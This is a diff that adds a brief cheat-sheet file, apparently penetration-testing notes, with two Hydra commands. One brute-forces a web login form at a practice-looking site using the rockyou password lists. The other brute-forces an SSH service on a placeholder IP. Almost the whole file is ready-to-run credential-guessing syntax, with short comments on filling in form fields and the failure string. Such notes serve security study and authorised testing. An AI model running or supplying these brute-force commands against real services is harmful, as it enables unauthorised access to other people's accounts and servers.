@@ -1,0 +1,7 @@
+#Bruteforcing a login page using Hydra.
+#Example syntax
+#Need to supply basic web app info. 
+#login user & pass field & error notification from the browser.
+hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -
+#Hydra against ssh service
+hydra <target ip> ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V
